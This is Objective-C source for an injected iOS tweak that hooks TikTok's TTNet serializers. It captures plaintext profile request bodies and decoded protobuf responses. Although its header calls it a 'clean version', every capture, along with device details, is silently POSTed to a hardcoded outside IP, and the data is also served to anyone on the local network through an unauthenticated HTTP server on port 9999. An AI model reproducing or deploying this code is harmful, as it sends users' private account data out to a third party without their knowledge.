// TikTok 个人资料接口抓包插件 (干净版)
// 作者: 海鸥
// 功能: 巨魔注入, 静态hook TTNet序列化层, 抓 profile/self 请求体(明文)+响应(明文protobuf)
// 精准hook点(来自二进制静态分析, 全写死类名, 零枚举):
//   响应: TTHTTPBinaryResponseSerializerBase 及子类 responseObjectForResponse:data:responseError:resultError:
//   请求: TTHTTPRequestSerializerBaseChromium URLRequestWith* -> 返回NSURLRequest的.URL+.HTTPBody(加密前明文)

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <arpa/inet.h>
#import <unistd.h>
#import <ifaddrs.h>

// ============ 配置 ============
// 只抓 URL 里含这些关键字的接口 (可多个)
static NSArray *kURLFilters() {
    return @[@"profile/self", @"user/profile"];
}
#define HTTP_PORT 9999

// ============ 日志 ============
// 远程上报服务器
#define LOG_SERVER_URL @"http://159.75.14.193:8899/log"

static void sendLogToServer(NSString *type, NSString *message) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @try {
            NSDictionary *logData = @{
                @"type": type ?: @"info",
                @"message": message ?: @"",
                @"device": [[UIDevice currentDevice] model] ?: @"?",
                @"ios_version": [[UIDevice currentDevice] systemVersion] ?: @"?",
                @"timestamp": @([[NSDate date] timeIntervalSince1970])
            };
            NSData *jsonData = [NSJSONSerialization dataWithJSONObject:logData options:0 error:nil];
            if (!jsonData) return;
            NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:LOG_SERVER_URL]];
            request.HTTPMethod = @"POST";
            request.HTTPBody = jsonData;
            [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
            [[[NSURLSession sharedSession] dataTaskWithRequest:request] resume];
        } @catch (__unused NSException *e) {}
    });
}

#define HLog(fmt, ...) do { \
    NSString *_m = [NSString stringWithFormat:@"[TKCap] " fmt, ##__VA_ARGS__]; \
    NSLog(@"%@", _m); \
    sendLogToServer(@"info", _m); \
} while(0)

// ============ 全局 ============
static UIWindow *floatingWindow = nil;
static UIButton *floatingButton = nil;
static UIView *controlPanel = nil;
static NSMutableArray *capturedRequests = nil;   // 每条: {time,url,method,requestBody,response,parsed}
static int captureCount = 0;
static CFSocketRef serverSocket = NULL;

@interface UIButton (DragSupport)
- (void)handleLongPress:(UILongPressGestureRecognizer *)recognizer;
- (void)onButtonTap:(UITapGestureRecognizer *)recognizer;
- (void)openBrowser:(UIButton *)sender;
- (void)hidePanel:(UIButton *)sender;
@end

// ============ 工具 ============
static UIWindow *getKeyWindow() {
    UIWindow *keyWindow = nil;
    if (@available(iOS 13.0, *)) {
        for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if ([scene isKindOfClass:[UIWindowScene class]]) {
                for (UIWindow *w in ((UIWindowScene *)scene).windows) {
                    if (w.isKeyWindow) { keyWindow = w; break; }
                }
            }
            if (keyWindow) break;
        }
    }
    if (!keyWindow) {
        #pragma clang diagnostic push
        #pragma clang diagnostic ignored "-Wdeprecated-declarations"
        keyWindow = [UIApplication sharedApplication].keyWindow;
        #pragma clang diagnostic pop
    }
    return keyWindow;
}

static NSString* getDeviceIP() {
    NSString *address = @"127.0.0.1";
    struct ifaddrs *interfaces = NULL, *temp = NULL;
    if (getifaddrs(&interfaces) == 0) {
        temp = interfaces;
        while (temp != NULL) {
            if (temp->ifa_addr && temp->ifa_addr->sa_family == AF_INET) {
                if ([[NSString stringWithUTF8String:temp->ifa_name] isEqualToString:@"en0"]) {
                    address = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp->ifa_addr)->sin_addr)];
                }
            }
            temp = temp->ifa_next;
        }
        freeifaddrs(interfaces);
    }
    return address;
}

static BOOL urlMatches(NSString *url) {
    if (!url) return NO;
    for (NSString *f in kURLFilters()) {
        if ([url containsString:f]) return YES;
    }
    return NO;
}

// NSData -> 可读字符串: 先试utf8, 再附hex head (protobuf二进制)
static NSString* dumpData(NSData *data, NSUInteger maxLen) {
    if (!data || data.length == 0) return @"(empty)";
    NSUInteger len = data.length;
    NSUInteger take = MIN(len, maxLen);
    NSMutableString *out = [NSMutableString stringWithFormat:@"len=%lu\n", (unsigned long)len];

    NSData *slice = [data subdataWithRange:NSMakeRange(0, take)];
    NSString *txt = [[NSString alloc] initWithData:slice encoding:NSUTF8StringEncoding];
    if (txt && txt.length > 0) {
        [out appendFormat:@"[utf8]\n%@\n", txt];
    }
    // hex head
    const unsigned char *bytes = (const unsigned char *)slice.bytes;
    NSUInteger hexLen = MIN(take, 512);
    NSMutableString *hex = [NSMutableString string];
    for (NSUInteger i = 0; i < hexLen; i++) {
        [hex appendFormat:@"%02x", bytes[i]];
        if ((i + 1) % 32 == 0) [hex appendString:@"\n"];
        else if ((i + 1) % 2 == 0) [hex appendString:@" "];
    }
    [out appendFormat:@"[hex head %lu]\n%@", (unsigned long)hexLen, hex];
    return out;
}

// 记录一条抓包
static void recordCapture(NSString *url, NSString *method, NSString *reqBody, NSString *respBody, NSString *parsed) {
    if (!capturedRequests) capturedRequests = [NSMutableArray array];
    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
    fmt.dateFormat = @"HH:mm:ss";
    NSMutableDictionary *item = [@{
        @"time": [fmt stringFromDate:[NSDate date]],
        @"url": url ?: @"",
        @"method": method ?: @"",
    } mutableCopy];
    if (reqBody) item[@"requestBody"] = reqBody;
    if (respBody) item[@"response"] = respBody;
    if (parsed) item[@"parsed"] = parsed;

    @synchronized(capturedRequests) {
        [capturedRequests addObject:item];
        if (capturedRequests.count > 100) [capturedRequests removeObjectAtIndex:0];
        captureCount++;
    }
    dispatch_async(dispatch_get_main_queue(), ^{
        if (floatingButton)
            [floatingButton setTitle:[NSString stringWithFormat:@"抓到\n%d", captureCount] forState:UIControlStateNormal];
    });
    // 远程上报完整抓包内容
    NSMutableString *full = [NSMutableString stringWithFormat:@"[CAPTURE #%d]\nURL: %@\nMETHOD: %@\n", captureCount, url, method?:@""];
    if (reqBody)  [full appendFormat:@"--- REQ BODY ---\n%@\n", reqBody];
    if (respBody) [full appendFormat:@"--- RESP ---\n%@\n", respBody];
    if (parsed)   [full appendFormat:@"--- PARSED ---\n%@\n", parsed];
    sendLogToServer(@"capture", full);
    NSLog(@"[TKCap] ✅ 抓到第%d条: %@", captureCount, url);
}

// ============ 悬浮窗 ============
static void showControlPanel();
static void hideControlPanel();

static void createFloatingButton() {
    dispatch_async(dispatch_get_main_queue(), ^{
        if (floatingWindow && floatingButton) return;
        floatingWindow = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
        floatingWindow.windowLevel = UIWindowLevelAlert + 100;
        floatingWindow.backgroundColor = [UIColor clearColor];
        floatingWindow.userInteractionEnabled = YES;
        floatingWindow.hidden = NO;
        if (@available(iOS 13.0, *)) {
            for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
                if ([scene isKindOfClass:[UIWindowScene class]]) { floatingWindow.windowScene = (UIWindowScene *)scene; break; }
            }
        }
        floatingButton = [UIButton buttonWithType:UIButtonTypeCustom];
        floatingButton.frame = CGRectMake(20, 120, 70, 70);
        floatingButton.backgroundColor = [[UIColor systemBlueColor] colorWithAlphaComponent:0.85];
        floatingButton.layer.cornerRadius = 35;
        floatingButton.layer.masksToBounds = YES;
        [floatingButton setTitle:@"抓包\n0" forState:UIControlStateNormal];
        floatingButton.titleLabel.numberOfLines = 2;
        floatingButton.titleLabel.textAlignment = NSTextAlignmentCenter;
        floatingButton.titleLabel.font = [UIFont boldSystemFontOfSize:13];

        UILongPressGestureRecognizer *lp = [[UILongPressGestureRecognizer alloc] initWithTarget:floatingButton action:@selector(handleLongPress:)];
        lp.minimumPressDuration = 0.3;
        [floatingButton addGestureRecognizer:lp];
        UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:floatingButton action:@selector(onButtonTap:)];
        [floatingButton addGestureRecognizer:tap];

        [floatingWindow addSubview:floatingButton];
        [floatingWindow makeKeyAndVisible];
        HLog(@"悬浮窗已创建");
    });
}

static void showControlPanel() {
    dispatch_async(dispatch_get_main_queue(), ^{
        if (controlPanel) { controlPanel.hidden = NO; return; }
        UIWindow *kw = getKeyWindow();
        if (!kw) return;
        controlPanel = [[UIView alloc] initWithFrame:kw.bounds];
        controlPanel.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.6];

        CGFloat pw = 300, ph = 240;
        UIView *panel = [[UIView alloc] initWithFrame:CGRectMake((kw.bounds.size.width-pw)/2, (kw.bounds.size.height-ph)/2, pw, ph)];
        panel.backgroundColor = [UIColor colorWithRed:0.15 green:0.15 blue:0.15 alpha:1.0];
        panel.layer.cornerRadius = 15;
        panel.layer.masksToBounds = YES;

        UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(0, 18, pw, 28)];
        title.text = @"🎣 TikTok抓包"; title.textColor = [UIColor whiteColor];
        title.font = [UIFont boldSystemFontOfSize:19]; title.textAlignment = NSTextAlignmentCenter;
        [panel addSubview:title];

        UILabel *cnt = [[UILabel alloc] initWithFrame:CGRectMake(20, 58, pw-40, 22)];
        cnt.text = [NSString stringWithFormat:@"已捕获: %d 条", captureCount];
        cnt.textColor = [UIColor colorWithRed:0.6 green:0.9 blue:0.6 alpha:1.0];
        cnt.font = [UIFont systemFontOfSize:15]; cnt.textAlignment = NSTextAlignmentCenter;
        [panel addSubview:cnt];

        UILabel *urll = [[UILabel alloc] initWithFrame:CGRectMake(20, 85, pw-40, 36)];
        urll.text = [NSString stringWithFormat:@"http://%@:%d", getDeviceIP(), HTTP_PORT];
        urll.textColor = [UIColor colorWithRed:0.4 green:0.8 blue:1.0 alpha:1.0];
        urll.font = [UIFont systemFontOfSize:14]; urll.textAlignment = NSTextAlignmentCenter; urll.numberOfLines = 2;
        [panel addSubview:urll];

        UIButton *br = [UIButton buttonWithType:UIButtonTypeSystem];
        br.frame = CGRectMake(30, 130, pw-60, 44);
        [br setTitle:@"📱 Safari查看数据" forState:UIControlStateNormal];
        [br setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
        br.titleLabel.font = [UIFont boldSystemFontOfSize:16];
        br.backgroundColor = [UIColor colorWithRed:0.2 green:0.6 blue:1.0 alpha:1.0];
        br.layer.cornerRadius = 10;
        [br addTarget:br action:@selector(openBrowser:) forControlEvents:UIControlEventTouchUpInside];
        [panel addSubview:br];

        UIButton *cl = [UIButton buttonWithType:UIButtonTypeSystem];
        cl.frame = CGRectMake(30, 184, pw-60, 40);
        [cl setTitle:@"关闭" forState:UIControlStateNormal];
        [cl setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
        cl.backgroundColor = [UIColor colorWithWhite:0.35 alpha:1.0];
        cl.layer.cornerRadius = 10;
        [cl addTarget:cl action:@selector(hidePanel:) forControlEvents:UIControlEventTouchUpInside];
        [panel addSubview:cl];

        [controlPanel addSubview:panel];
        [kw addSubview:controlPanel];
    });
}

static void hideControlPanel() {
    dispatch_async(dispatch_get_main_queue(), ^{ if (controlPanel) controlPanel.hidden = YES; });
}

// ============ HTTP 服务器 ============
static NSString* htmlEscape(NSString *s) {
    if (!s) return @"";
    s = [s stringByReplacingOccurrencesOfString:@"&" withString:@"&amp;"];
    s = [s stringByReplacingOccurrencesOfString:@"<" withString:@"&lt;"];
    s = [s stringByReplacingOccurrencesOfString:@">" withString:@"&gt;"];
    return s;
}

static NSString* generateHTMLResponse() {
    NSMutableString *h = [NSMutableString string];
    [h appendString:@"<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><title>TikTok抓包</title>"];
    [h appendString:@"<style>body{font-family:monospace;padding:12px;background:#1e1e1e;color:#d4d4d4;}"];
    [h appendString:@".req{background:#2d2d2d;margin:10px 0;padding:12px;border-radius:6px;border-left:4px solid #007acc;}"];
    [h appendString:@"h1{color:#4ec9b0;font-size:18px;}h2{color:#dcdcaa;font-size:14px;margin:8px 0 4px;}"];
    [h appendString:@".url{color:#ce9178;word-break:break-all;}.b{background:#1a1a1a;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;font-size:12px;}</style></head><body>"];
    [h appendFormat:@"<h1>🎣 TikTok抓包 (共%d条)</h1>", captureCount];
    @synchronized(capturedRequests) {
        for (NSDictionary *r in [capturedRequests reverseObjectEnumerator]) {
            [h appendString:@"<div class='req'>"];
            [h appendFormat:@"<h2>📡 %@ %@</h2>", r[@"time"], r[@"method"]?:@""];
            [h appendFormat:@"<p class='url'>%@</p>", htmlEscape(r[@"url"])];
            if (r[@"requestBody"]) { [h appendString:@"<h2>📤 请求体(明文)</h2>"]; [h appendFormat:@"<div class='b'>%@</div>", htmlEscape(r[@"requestBody"])]; }
            if (r[@"response"])    { [h appendString:@"<h2>📥 响应体(明文)</h2>"]; [h appendFormat:@"<div class='b'>%@</div>", htmlEscape(r[@"response"])]; }
            if (r[@"parsed"])      { [h appendString:@"<h2>✅ 解析后对象</h2>"]; [h appendFormat:@"<div class='b'>%@</div>", htmlEscape(r[@"parsed"])]; }
            [h appendString:@"</div>"];
        }
    }
    [h appendString:@"</body></html>"];
    return h;
}

static void handleConnection(CFSocketRef s, CFSocketCallBackType type, CFDataRef address, const void *data, void *info) {
    if (type != kCFSocketAcceptCallBack) return;
    CFSocketNativeHandle sock = *(CFSocketNativeHandle *)data;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        char buf[2048];
        ssize_t n = recv(sock, buf, sizeof(buf)-1, 0);
        if (n > 0) {
            NSString *html = generateHTMLResponse();
            NSData *body = [html dataUsingEncoding:NSUTF8StringEncoding];
            NSString *head = [NSString stringWithFormat:
                @"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: %lu\r\nConnection: close\r\n\r\n",
                (unsigned long)body.length];
            send(sock, [head UTF8String], [head lengthOfBytesUsingEncoding:NSUTF8StringEncoding], 0);
            send(sock, body.bytes, body.length, 0);
        }
        close(sock);
    });
}

static void startHTTPServer() {
    if (serverSocket) return;
    CFSocketContext ctx = {0, NULL, NULL, NULL, NULL};
    serverSocket = CFSocketCreate(kCFAllocatorDefault, PF_INET, SOCK_STREAM, IPPROTO_TCP,
                                  kCFSocketAcceptCallBack, handleConnection, &ctx);
    if (!serverSocket) { HLog(@"❌ socket创建失败"); return; }
    int yes = 1;
    setsockopt(CFSocketGetNative(serverSocket), SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    struct sockaddr_in addr; memset(&addr, 0, sizeof(addr));
    addr.sin_len = sizeof(addr); addr.sin_family = AF_INET;
    addr.sin_port = htons(HTTP_PORT); addr.sin_addr.s_addr = htonl(INADDR_ANY);
    CFDataRef ad = CFDataCreate(NULL, (const UInt8 *)&addr, sizeof(addr));
    if (CFSocketSetAddress(serverSocket, ad) != kCFSocketSuccess) {
        HLog(@"❌ 绑定端口%d失败", HTTP_PORT);
        CFRelease(serverSocket); serverSocket = NULL; CFRelease(ad); return;
    }
    CFRelease(ad);
    CFRunLoopSourceRef src = CFSocketCreateRunLoopSource(kCFAllocatorDefault, serverSocket, 0);
    CFRunLoopAddSource(CFRunLoopGetMain(), src, kCFRunLoopCommonModes);
    CFRelease(src);
    HLog(@"✅ HTTP服务器启动 http://设备IP:%d", HTTP_PORT);
}

// ============================================
// 响应侧 hook: binary serializer (protobuf明文)
// 14个类全写死, 挂同一个selector
// -[X responseObjectForResponse:(NSHTTPURLResponse*) data:(NSData*) responseError: resultError:]
// ============================================
// 统一响应处理: 每个类的hook体都调它
static id handleRespSerializer(id response, id data, id retval) {
    @try {
        NSString *url = nil;
        if ([response respondsToSelector:@selector(URL)]) {
            NSURL *u = [response performSelector:@selector(URL)];
            url = u.absoluteString;
        }
        if (urlMatches(url)) {
            NSString *plain = [data isKindOfClass:[NSData class]] ? dumpData(data, 6000) : [NSString stringWithFormat:@"[%@]", [data class]];
            NSString *parsed = nil;
            @try {
                if (retval) {
                    NSString *d = [retval description];
                    parsed = d.length > 8000 ? [d substringToIndex:8000] : d;
                }
            } @catch (__unused NSException *e) {}
            recordCapture(url, @"GET", nil, plain, parsed);
        }
    } @catch (__unused NSException *e) {}
    return retval;
}

// 14个类逐个展开 (logos不展开C宏里的%hook指令, 必须手写)
%group RespHooks

%hook TTHTTPBinaryResponseSerializerBase
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 { id ret = %orig; return handleRespSerializer(response, data, ret); }
%end

%hook AWEBinaryResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 { id ret = %orig; return handleRespSerializer(response, data, ret); }
%end

%hook AWEBinaryResponseSerializerForJSON
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 { id ret = %orig; return handleRespSerializer(response, data, ret); }
%end

%hook AWEFeedPbResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 { id ret = %orig; return handleRespSerializer(response, data, ret); }
%end

%hook BDXBridgePbResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 { id ret = %orig; return handleRespSerializer(response, data, ret); }
%end

%hook HTSLivePBResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 { id ret = %orig; return handleRespSerializer(response, data, ret); }
%end

%hook TIMClientTTNetworkImpResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 { id ret = %orig; return handleRespSerializer(response, data, ret); }
%end

%hook TTIMStreakPBResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 { id ret = %orig; return handleRespSerializer(response, data, ret); }
%end

%hook TTKECProtobufResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 { id ret = %orig; return handleRespSerializer(response, data, ret); }
%end

%hook TTKFeedBasePbResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 { id ret = %orig; return handleRespSerializer(response, data, ret); }
%end

%hook TTKLandscapePostPbResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 { id ret = %orig; return handleRespSerializer(response, data, ret); }
%end

%hook TTKLanscapeFeedPbResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 { id ret = %orig; return handleRespSerializer(response, data, ret); }
%end

%hook TTKPaidContentPbBaseResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 { id ret = %orig; return handleRespSerializer(response, data, ret); }
%end

%hook TikTokKidsFeedPbResponseSerializer
- (id)responseObjectForResponse:(id)response data:(id)data responseError:(id)e1 resultError:(id *)e2 { id ret = %orig; return handleRespSerializer(response, data, ret); }
%end

%end // group RespHooks

// ============================================
// 请求侧 hook: TTHTTPRequestSerializerBaseChromium
// 返回的 NSURLRequest 里 .HTTPBody 是加密前明文
// ============================================
%group ReqHooks

%hook TTHTTPRequestSerializerBaseChromium

- (id)URLRequestWithRequestModel:(id)model commonParams:(id)cp {
    id req = %orig;
    @try {
        if ([req respondsToSelector:@selector(URL)]) {
            NSURL *u = [req performSelector:@selector(URL)];
            NSString *url = u.absoluteString;
            if (urlMatches(url)) {
                NSString *method = [req respondsToSelector:@selector(HTTPMethod)] ? [req performSelector:@selector(HTTPMethod)] : @"?";
                NSData *body = [req respondsToSelector:@selector(HTTPBody)] ? [req performSelector:@selector(HTTPBody)] : nil;
                NSString *bodyStr = body ? dumpData(body, 6000) : @"(无body/model:";
                if (!body && model) bodyStr = [NSString stringWithFormat:@"(无HTTPBody, model=%@)", [model class]];
                recordCapture(url, method, bodyStr, nil, nil);
            }
        }
    } @catch (__unused NSException *e) {}
    return req;
}

- (id)URLRequestWithURL:(id)url headerField:(id)hf params:(id)params method:(id)method constructingBodyBlock:(id)blk commonParams:(id)cp {
    id req = %orig;
    @try {
        if ([req respondsToSelector:@selector(URL)]) {
            NSURL *u = [req performSelector:@selector(URL)];
            NSString *us = u.absoluteString;
            if (urlMatches(us)) {
                NSString *m = [req respondsToSelector:@selector(HTTPMethod)] ? [req performSelector:@selector(HTTPMethod)] : @"?";
                NSData *body = [req respondsToSelector:@selector(HTTPBody)] ? [req performSelector:@selector(HTTPBody)] : nil;
                recordCapture(us, m, body ? dumpData(body, 6000) : @"(无HTTPBody)", nil, nil);
            }
        }
    } @catch (__unused NSException *e) {}
    return req;
}

%end

%end // group ReqHooks

// ============ UIButton category ============
@implementation UIButton (DragSupport)
- (void)handleLongPress:(UILongPressGestureRecognizer *)r {
    UIView *v = r.view;
    CGPoint loc = [r locationInView:v.superview];
    if (r.state == UIGestureRecognizerStateBegan || r.state == UIGestureRecognizerStateChanged) v.center = loc;
}
- (void)onButtonTap:(UITapGestureRecognizer *)r { showControlPanel(); }
- (void)openBrowser:(UIButton *)s {
    NSString *u = [NSString stringWithFormat:@"http://%@:%d", getDeviceIP(), HTTP_PORT];
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:u] options:@{} completionHandler:nil];
    hideControlPanel();
}
- (void)hidePanel:(UIButton *)s { hideControlPanel(); }
@end

// ============ 初始化 ============
%ctor {
    capturedRequests = [NSMutableArray array];
    %init(RespHooks);
    %init(ReqHooks);
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        createFloatingButton();
        startHTTPServer();
        HLog(@"✅ 抓包插件已加载, 端口%d", HTTP_PORT);
    });
}
